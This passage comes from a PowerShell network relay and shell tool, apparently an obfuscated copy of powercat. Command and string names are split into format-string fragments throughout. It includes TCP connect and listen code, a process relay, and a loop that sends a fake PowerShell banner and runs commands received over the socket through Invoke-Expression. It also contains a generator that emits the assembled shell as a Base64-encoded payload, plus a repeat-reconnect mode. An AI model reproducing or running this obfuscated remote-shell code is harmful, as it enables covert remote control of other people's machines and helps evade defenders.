          if($FuncVars["l"]){$Socket.Stop()}
          else{$Socket.Close()}
          $Stopwatch.Stop()
          break
        }
      }
      if($Stopwatch.Elapsed.TotalSeconds -gt $t)
      {
        if(!$l){$Socket.Close()}
        else{$Socket.Stop()}
        $Stopwatch.Stop()
        &("{3}{1}{2}{0}"-f'e','-','Verbos','Write') ("{2}{1}{0}"-f '!','meout','Ti') ; break
        break
      }
      if($Handle.IsCompleted)
      {
        if(!$l)
        {
          try
          {
            $Socket.EndConnect($Handle)
            $Stream = $Socket.GetStream()
            $BufferSize = $Socket.ReceiveBufferSize
            &("{2}{1}{0}{3}" -f'rbos','e-Ve','Writ','e') (("{0}{2}{3}{1}" -f'Conne',' ','ctio','n to') + $c + ":" + $p + ("{4}{0}{3}{2}{1}" -f 'p] suc','!','ded','cee',' [tc'))
          }
          catch{$Socket.Close(); $Stopwatch.Stop(); break}
        }
        else
        {
          $Client = $Socket.EndAcceptTcpClient($Handle)
          $Stream = $Client.GetStream()
          $BufferSize = $Client.ReceiveBufferSize
          &("{3}{2}{1}{0}"-f'e','rbos','e-Ve','Writ') (("{4}{2}{5}{3}{0}{1}" -f 'tion ','from [','nn','c','Co','e') + $Client.Client.RemoteEndPoint.Address.IPAddressToString + ("{1}{0}" -f ' port ',']') + $port + ((("{0}{3}{4}{1}{5}{6}{2}{7}"-f' [t','acc','ce','cp]',' ','epted (so','ur',' port '))) + $Client.Client.RemoteEndPoint.Port + ")")
        }
        break
      }
    }
    $Stopwatch.Stop()
    if($Socket -eq $null){break}
    $FuncVars[("{1}{0}{2}" -f 'trea','S','m')] = $Stream
    $FuncVars[("{1}{0}"-f 'ket','Soc')] = $Socket
    $FuncVars[("{0}{1}{2}" -f'B','uffer','Size')] = $BufferSize
    $FuncVars[("{5}{1}{2}{0}{6}{3}{4}"-f 'ation','st','in','fe','r','StreamDe','Buf')] = (&("{2}{0}{1}"-f'j','ect','New-Ob') System.Byte[] $FuncVars[("{0}{1}{2}"-f 'Buffe','rS','ize')])
    $FuncVars[("{3}{0}{2}{1}"-f 'reamReadOp','ion','erat','St')] = $FuncVars[("{1}{0}{2}" -f'rea','St','m')].BeginRead($FuncVars[("{0}{4}{3}{2}{5}{1}"-f 'StreamDest','er','Bu','on','inati','ff')], 0, $FuncVars[("{2}{1}{0}" -f'ize','erS','Buff')], $null, $null)
    $FuncVars[("{1}{0}"-f'ing','Encod')] = &("{2}{0}{1}"-f 'w-Obje','ct','Ne') System.Text.AsciiEncoding
    $FuncVars[("{4}{3}{1}{2}{0}" -f 'ytesRead','am','B','e','Str')] = 1
    return $FuncVars
  }
  function ReadData_TCP
  {
    param($FuncVars)
    $Data = $null
    if($FuncVars[("{2}{3}{0}{1}" -f'tesR','ead','St','reamBy')] -eq 0){break}
    if($FuncVars[("{4}{3}{1}{5}{0}{2}" -f 'i','mReadOper','on','ea','Str','at')].IsCompleted)
    {
      $StreamBytesRead = $FuncVars[("{2}{1}{0}" -f'm','trea','S')].EndRead($FuncVars[("{1}{4}{2}{5}{3}{0}"-f 'on','S','amRe','erati','tre','adOp')])
      if($StreamBytesRead -eq 0){break}
      $Data = $FuncVars[("{3}{1}{0}{2}"-f 'mDestinati','a','onBuffer','Stre')][0..([int]$StreamBytesRead-1)]
      $FuncVars[("{1}{2}{0}{3}{4}" -f 'adOper','Str','eamRe','atio','n')] = $FuncVars[("{0}{1}" -f 'Strea','m')].BeginRead($FuncVars[("{2}{4}{3}{1}{5}{0}"-f 'r','uff','Strea','nationB','mDesti','e')], 0, $FuncVars[("{1}{0}{2}"-f'r','Buffe','Size')], $null, $null)
    }
    return $Data,$FuncVars
  }
  function WriteData_TCP
  {
    param($Data,$FuncVars)
    $FuncVars[("{1}{0}" -f'm','Strea')].Write($Data, 0, $Data.Length)
    return $FuncVars
  }
  function Close_TCP
  {
    param($FuncVars)
    try{$FuncVars[("{0}{1}" -f'S','tream')].Close()}
    catch{}
    if($FuncVars["l"]){$FuncVars[("{1}{0}"-f 'ket','Soc')].Stop()}
    else{$FuncVars[("{1}{0}"-f 'ocket','S')].Close()}
  }
  ########## TCP FUNCTIONS ##########
  
  ########## CMD FUNCTIONS ##########
  function Setup_CMD
  {
    param($FuncSetupVars)
    if($global:Verbose){$Verbose = $True}
    $FuncVars = @{}
    $ProcessStartInfo = &("{2}{1}{0}" -f'ect','ew-Obj','N') System.Diagnostics.ProcessStartInfo
    $ProcessStartInfo.FileName = $FuncSetupVars[0]
    $ProcessStartInfo.UseShellExecute = $False
    $ProcessStartInfo.RedirectStandardInput = $True
    $ProcessStartInfo.RedirectStandardOutput = $True
    $ProcessStartInfo.RedirectStandardError = $True
    $FuncVars[("{1}{2}{0}" -f's','P','roces')] = [System.Diagnostics.Process]::Start($ProcessStartInfo)
    &("{3}{0}{2}{1}"-f'rite-Ver','se','bo','W') (("{0}{4}{1}{2}{3}"-f'St','ing Proce','ss',' ','art') + $FuncSetupVars[0] + "...")
    $FuncVars[("{0}{2}{1}"-f'Proce','s','s')].Start() | &("{1}{0}" -f'l','Out-Nul')
    $FuncVars[("{6}{1}{3}{0}{2}{5}{4}" -f'tDestinati','tdO','on','u','r','Buffe','S')] = &("{1}{2}{0}{3}" -f 'jec','New-','Ob','t') System.Byte[] 65536
    $FuncVars[("{0}{1}{4}{2}{3}" -f 'Std','Ou','eadO','peration','tR')] = $FuncVars[("{2}{0}{1}" -f'oc','ess','Pr')].StandardOutput.BaseStream.BeginRead($FuncVars[("{5}{6}{4}{3}{1}{0}{2}" -f 'uffe','nB','r','estinatio','D','StdO','ut')], 0, 65536, $null, $null)
    $FuncVars[("{0}{2}{4}{3}{1}" -f'StdErrDes','r','tination','uffe','B')] = &("{2}{3}{1}{0}" -f 't','c','New-Obj','e') System.Byte[] 65536
    $FuncVars[("{1}{4}{3}{0}{2}" -f'rat','StdE','ion','rReadOpe','r')] = $FuncVars[("{1}{0}" -f'ss','Proce')].StandardError.BaseStream.BeginRead($FuncVars[("{5}{2}{4}{0}{3}{1}"-f 'rDestin','nBuffer','E','atio','r','Std')], 0, 65536, $null, $null)
    $FuncVars[("{2}{1}{0}"-f'oding','c','En')] = &("{0}{2}{1}" -f 'New','t','-Objec') System.Text.AsciiEncoding
    return $FuncVars
  }
  function ReadData_CMD
  {
    param($FuncVars)
    [byte[]]$Data = @()
    if($FuncVars[("{0}{2}{1}{3}"-f 'StdO','tReadOper','u','ation')].IsCompleted)
    {
      $StdOutBytesRead = $FuncVars[("{1}{0}{2}" -f 'e','Proc','ss')].StandardOutput.BaseStream.EndRead($FuncVars[("{3}{0}{2}{4}{1}"-f 'O','ration','utReadOp','Std','e')])
      if($StdOutBytesRead -eq 0){break}
      $Data += $FuncVars[("{1}{3}{2}{5}{0}{4}"-f'io','StdOutD','ina','est','nBuffer','t')][0..([int]$StdOutBytesRead-1)]
      $FuncVars[("{1}{3}{0}{4}{6}{5}{2}" -f 'Read','StdO','ration','ut','O','e','p')] = $FuncVars[("{1}{0}"-f's','Proces')].StandardOutput.BaseStream.BeginRead($FuncVars[("{1}{4}{5}{3}{2}{0}"-f'Buffer','StdOu','on','ati','tDe','stin')], 0, 65536, $null, $null)
    }
    if($FuncVars[("{1}{3}{2}{0}{4}"-f 'i','St','rrReadOperat','dE','on')].IsCompleted)
    {
      $StdErrBytesRead = $FuncVars[("{1}{0}{2}" -f 'oces','Pr','s')].StandardError.BaseStream.EndRead($FuncVars[("{0}{1}{3}{2}{4}"-f'St','dEr','a','rReadOper','tion')])
      if($StdErrBytesRead -eq 0){break}
      $Data += $FuncVars[("{3}{4}{0}{1}{2}"-f'rDesti','nationBu','ffer','Std','Er')][0..([int]$StdErrBytesRead-1)]
      $FuncVars[("{1}{3}{0}{2}"-f 'erati','StdErrRe','on','adOp')] = $FuncVars[("{0}{1}"-f 'Pro','cess')].StandardError.BaseStream.BeginRead($FuncVars[("{5}{6}{0}{3}{4}{2}{1}"-f'rDes','ffer','Bu','tinat','ion','St','dEr')], 0, 65536, $null, $null)
    }
    return $Data,$FuncVars
  }
  function WriteData_CMD
  {
    param($Data,$FuncVars)
    $FuncVars[("{1}{0}{2}"-f'c','Pro','ess')].StandardInput.WriteLine($FuncVars[("{1}{0}"-f 'g','Encodin')].GetString($Data).TrimEnd("`r").TrimEnd("`n"))
    return $FuncVars
  }
  function Close_CMD
  {
    param($FuncVars)
    $FuncVars[("{2}{1}{0}"-f 'ocess','r','P')] | &("{2}{0}{1}{3}"-f'op-','Pr','St','ocess')
  }  
  ########## CMD FUNCTIONS ##########
  
  ########## POWERSHELL FUNCTIONS ##########
  function Main_Powershell
  {
    param($Stream1SetupVars)   
    try
    {
      $encoding = &("{0}{1}{2}" -f 'New-','Ob','ject') System.Text.AsciiEncoding
      [byte[]]$InputToWrite = @()
      if($i -ne $null)
      {
        &("{2}{1}{0}{3}"-f'o','-Verb','Write','se') ("{3}{4}{1}{0}{2}"-f' dete','i','cted...','Input from',' -')
        if(&("{1}{3}{2}{0}" -f'ath','T','-P','est') $i){ [byte[]]$InputToWrite = ([io.file]::ReadAllBytes($i)) }
        elseif($i.GetType().Name -eq ("{0}{1}" -f 'Byte','[]')){ [byte[]]$InputToWrite = $i }
        elseif($i.GetType().Name -eq ("{0}{1}" -f'S','tring')){ [byte[]]$InputToWrite = $Encoding.GetBytes($i) }
        else{&("{0}{1}{2}" -f 'W','ri','te-Host') ("{1}{0}{2}{3}{4}"-f'ecognised','Unr',' inpu','t',' type.') ; return}
      }
    
      &("{0}{1}{2}{4}{3}" -f'W','r','ite-','rbose','Ve') (("{10}{1}{2}{4}{6}{9}{11}{7}{3}{5}{0}{8}"-f 'L to exit','ng',' ','C/C','up','TR',' S','ES',')','tre','Setti','am 1... ('))
      try{$Stream1Vars = &("{0}{1}{2}{3}" -f'S','tream','1_S','etup') $Stream1SetupVars}
      catch{&("{0}{1}{2}"-f'Write-Ver','bo','se') ("{0}{2}{5}{3}{4}{1}"-f'S','e','tream 1 Set','ailu','r','up F') ; return}
      
      &("{1}{3}{4}{0}{2}"-f 'e','W','rbose','rite-','V') ("{3}{7}{6}{1}{2}{0}{5}{4}"-f 'ESC','eam 2...',' (','Se','it)','/CTRL to ex','ting up Str','t')
      try
      {
        $IntroPrompt = $Encoding.GetBytes(('Windo'+'ws'+' '+"PowerShell`nCopyright "+'(C)'+' '+'2013'+' '+'Microso'+'ft'+' '+'C'+'o'+'rporat'+'ion. '+'All'+' '+'rig'+'hts '+"reserved.`n`n") + ("PS " + (&("{1}{0}"-f 'd','pw')).Path + "> "))
        $Prompt = ("PS " + (&("{0}{1}" -f 'p','wd')).Path + "> ")
        $CommandToExecute = ""      
        $Data = $null
      }
      catch
      {
        &("{2}{1}{3}{0}"-f'e','e-V','Writ','erbos') ("{3}{1}{6}{0}{2}{4}{5}"-f'2','a',' Se','Stre','tup Fa','ilure','m ') ; return
      }
      
      if($InputToWrite -ne @())
      {
        &("{1}{0}{3}{2}" -f 'te-Ver','Wri','e','bos') ("{3}{4}{1}{6}{7}{2}{0}{5}"-f'eam','in',' Str','W','rit',' 1...','g',' input to')
        try{$Stream1Vars = &("{3}{0}{2}{1}{4}"-f'r','teD','eam1_Wri','St','ata') $InputToWrite $Stream1Vars}
        catch{&("{2}{0}{1}"-f 'ite-Ho','st','Wr') ("{0}{4}{5}{1}{3}{6}{2}"-f 'Failed t','te','tream 1',' input ','o',' wri','to S') ; return}
      }
      
      if($d){&("{1}{2}{0}"-f'rbose','W','rite-Ve') ("{2}{5}{0}{4}{7}{6}{1}{3}"-f 'sconne','ated. Disconnecting..','-','.','ct','d (di','iv',') Act') ; return}
      
      &("{3}{2}{0}{1}"-f'b','ose','er','Write-V') ("{2}{3}{8}{12}{4}{11}{7}{5}{13}{6}{1}{10}{14}{0}{9}" -f 's','ta B','B','oth Com','eam','shed. Redirec','ng Da','tabli','munication S','...','etween Stre','s Es','tr','ti','am')
      while($True)
      {        
        try
        {
          ##### Stream2 Read #####
          $Prompt = $null
          $ReturnedData = $null
          if($CommandToExecute -ne "")
          {
            try{[byte[]]$ReturnedData = $Encoding.GetBytes((&("{1}{0}"-f 'EX','I') $CommandToExecute 2>&1 | &("{1}{2}{0}" -f 'tring','O','ut-S')))}
            catch{[byte[]]$ReturnedData = $Encoding.GetBytes(($_ | &("{0}{2}{1}" -f 'Ou','ring','t-St')))}
            $Prompt = $Encoding.GetBytes(("PS " + (&("{0}{1}"-f 'p','wd')).Path + "> "))
          }
          $Data += $IntroPrompt
          $IntroPrompt = $null
          $Data += $ReturnedData
          $Data += $Prompt
          $CommandToExecute = ""
          ##### Stream2 Read #####

          if($Data -ne $null){$Stream1Vars = &("{1}{0}{2}{3}" -f'm1_W','Strea','riteD','ata') $Data $Stream1Vars}
          $Data = $null
        }
        catch
        {
          &("{2}{0}{1}"-f's','e','Write-Verbo') ("{4}{6}{13}{0}{7}{5}{10}{12}{3}{11}{8}{1}{2}{9}"-f 'o','a','m ','to ','Fa','from','ile',' redirect data ','e','1',' Strea','Str','m 2 ','d t') ; return
        }
        
        try
        {
          $Data,$Stream1Vars = &("{0}{4}{3}{2}{1}"-f 'S','a','at','ream1_ReadD','t') $Stream1Vars
          if($Data.Length -eq 0){&("{2}{1}{0}"-f'-Sleep','art','St') -Milliseconds 100}
          if($Data -ne $null){$CommandToExecute = $Encoding.GetString($Data)}
          $Data = $null
        }
        catch
        {
          &("{2}{0}{3}{1}" -f 'rite','Verbose','W','-') ("{0}{7}{8}{1}{6}{3}{5}{4}{2}"-f 'Faile',' fro','ream 2','Str','1 to St','eam ','m ','d ','to redirect data') ; return
        }
      }
    }
    finally
    {
      try
      {
        &("{0}{3}{2}{4}{1}"-f'Writ','rbose','V','e-','e') ("{0}{2}{3}{1}{4}"-f'C','trea','losing ','S','m 1...')
        &("{0}{2}{3}{1}" -f'Str','e','eam1','_Clos') $Stream1Vars
      }
      catch
      {
        &("{3}{1}{2}{0}" -f'bose','rite-Ve','r','W') ("{2}{3}{5}{0}{1}{4}" -f 'o c','lose Strea','Fa','iled ','m 1','t')
      }
    }
  }
  ########## POWERSHELL FUNCTIONS ##########

  ########## CONSOLE FUNCTIONS ##########
  function Setup_Console
  {
    param($FuncSetupVars)
    $FuncVars = @{}
    $FuncVars[("{2}{1}{0}"-f 'ng','di','Enco')] = &("{0}{2}{1}" -f 'N','ct','ew-Obje') System.Text.AsciiEncoding
    $FuncVars[("{1}{0}" -f 't','Outpu')] = $FuncSetupVars[0]
    $FuncVars[("{1}{2}{0}" -f 'Bytes','Outpu','t')] = [byte[]]@()
    $FuncVars[("{2}{1}{0}" -f 'ng','ri','OutputSt')] = ""
    return $FuncVars
  }
  function ReadData_Console
  {
    param($FuncVars)
    $Data = $null
    if($Host.UI.RawUI.KeyAvailable)
    {
      $Data = $FuncVars[("{2}{1}{0}"-f'ng','i','Encod')].GetBytes((&("{0}{1}{2}" -f'Re','ad-','Host')) + "`n")
    }
    return $Data,$FuncVars
  }
  function WriteData_Console
  {
    param($Data,$FuncVars)
    switch($FuncVars[("{0}{1}{2}" -f'Ou','tp','ut')])
    {
      ("{1}{0}" -f'st','Ho') {&("{0}{3}{1}{2}" -f 'Writ','os','t','e-H') -n $FuncVars[("{1}{0}{2}"-f'ncod','E','ing')].GetString($Data)}
      ("{1}{0}" -f'ing','Str') {$FuncVars[("{2}{1}{0}{3}" -f 'ri','St','Output','ng')] += $FuncVars[("{1}{0}" -f'ding','Enco')].GetString($Data)}
      ("{0}{1}" -f'Byt','es') {$FuncVars[("{0}{3}{2}{1}"-f'Ou','utBytes','p','t')] += $Data}
    }
    return $FuncVars
  }
  function Close_Console
  {
    param($FuncVars)
    if($FuncVars[("{1}{3}{2}{0}" -f'ing','Ou','utStr','tp')] -ne ""){return $FuncVars[("{1}{2}{0}" -f 'ing','Output','Str')]}
    elseif($FuncVars[("{0}{2}{1}"-f 'Output','tes','By')] -ne @()){return $FuncVars[("{2}{0}{1}"-f'put','Bytes','Out')]}
    return
  }
  ########## CONSOLE FUNCTIONS ##########
  
  ########## MAIN FUNCTION ##########
  function Main
  {
    param($Stream1SetupVars,$Stream2SetupVars)
    try
    {
      [byte[]]$InputToWrite = @()
      $Encoding = &("{1}{2}{0}"-f 'ct','New-Ob','je') System.Text.AsciiEncoding
      if($i -ne $null)
      {
        &("{1}{0}{2}"-f'te-Verbos','Wri','e') ("{6}{5}{2}{4}{0}{3}{1}" -f 't','..','rom ','ected.','-i de','put f','In')
        if(&("{2}{0}{1}"-f 'st','-Path','Te') $i){ [byte[]]$InputToWrite = ([io.file]::ReadAllBytes($i)) }
        elseif($i.GetType().Name -eq ("{1}{0}" -f'[]','Byte')){ [byte[]]$InputToWrite = $i }
        elseif($i.GetType().Name -eq ("{0}{1}{2}"-f 'S','tri','ng')){ [byte[]]$InputToWrite = $Encoding.GetBytes($i) }
        else{&("{0}{1}{2}" -f'Write-','H','ost') ("{1}{2}{3}{0}{4}"-f'd input ty','Unre','c','ognise','pe.') ; return}
      }
      
      &("{0}{1}{2}" -f'Writ','e-Ver','bose') ("{5}{3}{1}{2}{4}{0}" -f'..',' u','p Str','etting','eam 1.','S')
      try{$Stream1Vars = &("{1}{2}{0}{3}"-f'Se','Str','eam1_','tup') $Stream1SetupVars}
      catch{&("{2}{0}{1}" -f'ite-Ver','bose','Wr') ("{3}{0}{1}{4}{2}"-f're','am 1','tup Failure','St',' Se') ; return}
      
      &("{2}{3}{1}{0}" -f 'ose','e-Verb','Wri','t') ("{4}{3}{0}{2}{1}"-f ' up Strea',' 2...','m','ng','Setti')
      try{$Stream2Vars = &("{1}{2}{0}{3}"-f 'am2_','S','tre','Setup') $Stream2SetupVars}
      catch{&("{1}{2}{0}" -f'e','Write-Ver','bos') ("{0}{2}{1}{4}{3}"-f 'Stream','p Fai',' 2 Setu','e','lur') ; return}
      
      $Data = $null
      
      if($InputToWrite -ne @())
      {
        &("{3}{1}{2}{0}"-f 'e','rite-Verbo','s','W') ("{0}{2}{1}{4}{3}" -f'Writin','put t','g in','..','o Stream 1.')
        try{$Stream1Vars = &("{4}{1}{0}{2}{3}"-f '_W','m1','riteDa','ta','Strea') $InputToWrite $Stream1Vars}
        catch{&("{1}{0}{2}"-f 'rite','W','-Host') ("{5}{4}{0}{2}{3}{1}"-f'e in','1','put to Strea','m ','led to writ','Fai') ; return}
      }
      
      if($d){&("{2}{0}{1}" -f'rb','ose','Write-Ve') ("{4}{6}{0}{1}{2}{5}{9}{7}{8}{10}{3}" -f ' ','(discon','n','ecting...','-','ec','d','vat','ed. Disc','t) Acti','onn') ; return}
      
      &("{1}{0}{2}" -f 'V','Write-','erbose') ("{3}{12}{17}{11}{6}{2}{7}{0}{14}{1}{5}{15}{4}{9}{10}{8}{16}{13}"-f'e','ng ','stabli','Both C','B','D',' Streams E','shed. R','St','e','tween ','n','ommu','..','directi','ata ','reams.','nicatio')
      while($True)
      {
        try
        {
          $Data,$Stream2Vars = &("{0}{4}{1}{3}{2}"-f 'Stream2_Re','d','a','Dat','a') $Stream2Vars
          if(($Data.Length -eq 0) -or ($Data -eq $null)){&("{1}{0}{2}" -f 'rt-S','Sta','leep') -Milliseconds 100}
          if($Data -ne $null){$Stream1Vars = &("{1}{4}{0}{3}{2}" -f'1_Wr','Str','Data','ite','eam') $Data $Stream1Vars}
          $Data = $null
        }
        catch
        {
          &("{3}{0}{2}{4}{1}" -f 'rite','se','-','W','Verbo') ("{9}{10}{4}{7}{8}{3}{11}{5}{2}{6}{1}{0}"-f' Stream 1',' 2 to','a','from S','irect da','e','m','ta',' ','Failed to r','ed','tr') ; return
        }
        
        try
        {
          $Data,$Stream1Vars = &("{2}{1}{3}{0}{4}"-f'_Rea','m','Strea','1','dData') $Stream1Vars
          if(($Data.Length -eq 0) -or ($Data -eq $null)){&("{0}{1}{2}{3}" -f 'S','t','ar','t-Sleep') -Milliseconds 100}
          if($Data -ne $null){$Stream2Vars = &("{5}{2}{3}{1}{4}{0}"-f'ata','ri','ea','m2_W','teD','Str') $Data $Stream2Vars}
          $Data = $null
        }
        catch
        {
          &("{0}{3}{2}{1}{4}" -f'W','-','te','ri','Verbose') ("{1}{9}{4}{7}{2}{8}{3}{6}{5}{0}"-f' 2','Failed t','a','tre','ct d','ream','am 1 to St','at',' from S','o redire') ; return
        }
      }
    }
    finally
    {
      try
      {
        #Write-Verbose "Closing Stream 2..."
        &("{3}{1}{0}{2}" -f 's','2_Clo','e','Stream') $Stream2Vars
      }
      catch
      {
        &("{1}{2}{0}" -f 'ose','Write-V','erb') ("{2}{3}{0}{4}{1}"-f 'rea',' 2','Failed to close ','St','m')
      }
      try
      {
        #Write-Verbose "Closing Stream 1..."
        &("{0}{2}{1}"-f'S','e','tream1_Clos') $Stream1Vars
      }
      catch
      {
        &("{2}{1}{3}{0}" -f '-Verbose','rit','W','e') ("{2}{3}{0}{4}{5}{1}" -f 'se ','1','Failed to',' clo','Str','eam ')
      }
    }
  }
  ########## MAIN FUNCTION ##########
  
  ########## GENERATE PAYLOAD ##########
  if($u)
  {
    &("{1}{3}{4}{0}{2}"-f'Verb','Writ','ose','e','-') ("{4}{1}{0}{3}{2}" -f'eam 1',' Str','P',': UD','Set')
    $FunctionString = ("function Stream1_Setup`n{`n" + ${function:Setup_UDP} + "`n}`n`n")
    $FunctionString += ("function Stream1_ReadData`n{`n" + ${function:ReadData_UDP} + "`n}`n`n")
    $FunctionString += ("function Stream1_WriteData`n{`n" + ${function:WriteData_UDP} + "`n}`n`n")
    $FunctionString += ("function Stream1_Close`n{`n" + ${function:Close_UDP} + "`n}`n`n")    
    if($l){$InvokeString = ('Mai'+'n '+"@('',`$True,'$p','$t') "+'')}
    else{$InvokeString = ('M'+'ain '+"@('$c',`$False,'$p','$t') "+'')}
  }
  elseif($dns -ne "")
  {
    &("{1}{0}{2}"-f'V','Write-','erbose') ("{0}{3}{2}{1}"-f'Set ','1: DNS','tream ','S')
    $FunctionString = ("function Stream1_Setup`n{`n" + ${function:Setup_DNS} + "`n}`n`n")
    $FunctionString += ("function Stream1_ReadData`n{`n" + ${function:ReadData_DNS} + "`n}`n`n")
    $FunctionString += ("function Stream1_WriteData`n{`n" + ${function:WriteData_DNS} + "`n}`n`n")
    $FunctionString += ("function Stream1_Close`n{`n" + ${function:Close_DNS} + "`n}`n`n")
    if($l){return ("{2}{3}{6}{4}{7}{5}{0}{1}" -f'is not availab','le.','T','hi',' feat','e ','s','ur')}
    else{$InvokeString = ('M'+'ain '+"@('$c','$p','$dns',$dnsft) "+'')}
  }
  else
  {
    &("{3}{2}{1}{4}{0}" -f'rbose','t','i','Wr','e-Ve') ("{5}{1}{3}{2}{0}{4}"-f'T','trea',' 1: ','m','CP','Set S')
    $FunctionString = ("function Stream1_Setup`n{`n" + ${function:Setup_TCP} + "`n}`n`n")
    $FunctionString += ("function Stream1_ReadData`n{`n" + ${function:ReadData_TCP} + "`n}`n`n")
    $FunctionString += ("function Stream1_WriteData`n{`n" + ${function:WriteData_TCP} + "`n}`n`n")
    $FunctionString += ("function Stream1_Close`n{`n" + ${function:Close_TCP} + "`n}`n`n")
    if($l){$InvokeString = ('Mai'+'n '+"@('',`$True,$p,$t) "+'')}
    else{$InvokeString = ('Ma'+'in '+"@('$c',`$False,$p,$t) "+'')}
  }
  
  if($e -ne "")
  {
    &("{2}{3}{1}{0}"-f 'se','erbo','Write-','V') ("{2}{0}{4}{1}{3}" -f't Stream','oc','Se','ess',' 2: Pr')
    $FunctionString += ("function Stream2_Setup`n{`n" + ${function:Setup_CMD} + "`n}`n`n")
    $FunctionString += ("function Stream2_ReadData`n{`n" + ${function:ReadData_CMD} + "`n}`n`n")
    $FunctionString += ("function Stream2_WriteData`n{`n" + ${function:WriteData_CMD} + "`n}`n`n")
    $FunctionString += ("function Stream2_Close`n{`n" + ${function:Close_CMD} + "`n}`n`n")
    $InvokeString += "@('$e')`n`n"
  }
  elseif($ep)
  {
    &("{1}{3}{2}{0}" -f 'se','Write-Ve','o','rb') ("{0}{6}{5}{3}{1}{2}{4}" -f 'Se','s','hel','wer','l','tream 2: Po','t S')
    $InvokeString += "`n`n"
  }
  elseif($r -ne "")
  {
    if($r.split(":")[0].ToLower() -eq "udp")
    {
      &("{3}{0}{2}{4}{1}"-f 'ite-','bose','Ve','Wr','r') ("{2}{3}{4}{1}{0}"-f 'P','UD','Set Strea','m 2:',' ')
      $FunctionString += ("function Stream2_Setup`n{`n" + ${function:Setup_UDP} + "`n}`n`n")
      $FunctionString += ("function Stream2_ReadData`n{`n" + ${function:ReadData_UDP} + "`n}`n`n")
      $FunctionString += ("function Stream2_WriteData`n{`n" + ${function:WriteData_UDP} + "`n}`n`n")
      $FunctionString += ("function Stream2_Close`n{`n" + ${function:Close_UDP} + "`n}`n`n")    
      if($r.split(":").Count -eq 2){$InvokeString += ("@('',`$True,'" + $r.split(":")[1] + ("','$t') "+''))}
      elseif($r.split(":").Count -eq 3){$InvokeString += ("@('" + $r.split(":")[1] + "',`$False,'" + $r.split(":")[2] + ("','$t') "+''))}
      else{return ("{1}{0}{3}{2}"-f'ad ','B','rmat.','relay fo')}
    }
    if($r.split(":")[0].ToLower() -eq "dns")
    {
      &("{0}{2}{1}{3}{4}"-f 'W','t','ri','e-Ver','bose') ("{3}{1}{4}{0}{2}"-f'am 2:','t',' DNS','Se',' Stre')
      $FunctionString += ("function Stream2_Setup`n{`n" + ${function:Setup_DNS} + "`n}`n`n")
      $FunctionString += ("function Stream2_ReadData`n{`n" + ${function:ReadData_DNS} + "`n}`n`n")
      $FunctionString += ("function Stream2_WriteData`n{`n" + ${function:WriteData_DNS} + "`n}`n`n")
      $FunctionString += ("function Stream2_Close`n{`n" + ${function:Close_DNS} + "`n}`n`n")
      if($r.split(":").Count -eq 2){return ("{7}{5}{4}{2}{8}{1}{0}{3}{6}"-f 'a',' av','feature is n','il',' ','his','able.','T','ot')}
      elseif($r.split(":").Count -eq 4){$InvokeString += ("@('" + $r.split(":")[1] + "','" + $r.split(":")[2] + "','" + $r.split(":")[3] + ("',$dnsft) "+''))}
      else{return ("{3}{4}{1}{2}{0}" -f 'rmat.','y',' fo','Bad',' rela')}
    }
    elseif($r.split(":")[0].ToLower() -eq "tcp")
    {
      &("{3}{4}{2}{1}{0}"-f'bose','Ver','e-','Wri','t') ("{0}{3}{1}{4}{2}"-f'Set','tream ','TCP',' S','2: ')
      $FunctionString += ("function Stream2_Setup`n{`n" + ${function:Setup_TCP} + "`n}`n`n")
      $FunctionString += ("function Stream2_ReadData`n{`n" + ${function:ReadData_TCP} + "`n}`n`n")
      $FunctionString += ("function Stream2_WriteData`n{`n" + ${function:WriteData_TCP} + "`n}`n`n")
      $FunctionString += ("function Stream2_Close`n{`n" + ${function:Close_TCP} + "`n}`n`n")
      if($r.split(":").Count -eq 2){$InvokeString += ("@('',`$True,'" + $r.split(":")[1] + ("','$t') "+''))}
      elseif($r.split(":").Count -eq 3){$InvokeString += ("@('" + $r.split(":")[1] + "',`$False,'" + $r.split(":")[2] + ("','$t') "+''))}
      else{return ("{0}{1}{2}{3}" -f 'B','ad',' relay ','format.')}
    }
  }
  else
  {
    &("{2}{0}{1}"-f't','e-Verbose','Wri') ("{6}{5}{2}{1}{4}{3}{0}"-f'e','am ','e','ol','2: Cons','Str','Set ')
    $FunctionString += ("function Stream2_Setup`n{`n" + ${function:Setup_Console} + "`n}`n`n")
    $FunctionString += ("function Stream2_ReadData`n{`n" + ${function:ReadData_Console} + "`n}`n`n")
    $FunctionString += ("function Stream2_WriteData`n{`n" + ${function:WriteData_Console} + "`n}`n`n")
    $FunctionString += ("function Stream2_Close`n{`n" + ${function:Close_Console} + "`n}`n`n")
    $InvokeString += ("@('" + $o + "')")
  }
  
  if($ep){$FunctionString += ("function Main`n{`n" + ${function:Main_Powershell} + "`n}`n`n")}
  else{$FunctionString += ("function Main`n{`n" + ${function:Main} + "`n}`n`n")}
  $InvokeString = ($FunctionString + $InvokeString)
  ########## GENERATE PAYLOAD ##########
  
  ########## RETURN GENERATED PAYLOADS ##########
  if($ge){&("{3}{1}{0}{2}" -f'Verbo','e-','se','Writ') ("{2}{4}{3}{1}{0}"-f 'oad...','l','Re','ed Pay','turning Encod') ; return [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($InvokeString))}
  elseif($g){&("{3}{2}{1}{4}{0}" -f'e','Verbo','-','Write','s') ("{2}{3}{0}{1}" -f 'yload','...','Returning',' Pa') ; return $InvokeString}
  ########## RETURN GENERATED PAYLOADS ##########
  
  ########## EXECUTION ##########
  $Output = $null
  try
  {
    if($rep)
    {
      while($True)
      {
        $Output += &("{1}{0}" -f 'X','IE') $InvokeString
        &("{1}{2}{0}"-f'rt-Sleep','S','ta') -s 2
        &("{1}{3}{2}{0}"-f'Verbose','W','ite-','r') ("{6}{3}{2}{5}{1}{0}{4}"-f 'in','start','n Ena','titio','g...','bled: Re','Repe')
      }
    }
    else
    {
      $Output += &("{0}{1}" -f 'IE','X') $InvokeString
    }
  }
  finally
  {
    if($Output -ne $null)
    {
      if($of -eq ""){$Output}
      else{[io.file]::WriteAllBytes($of,$Output)}
    }
  }
  ########## EXECUTION ##########
}

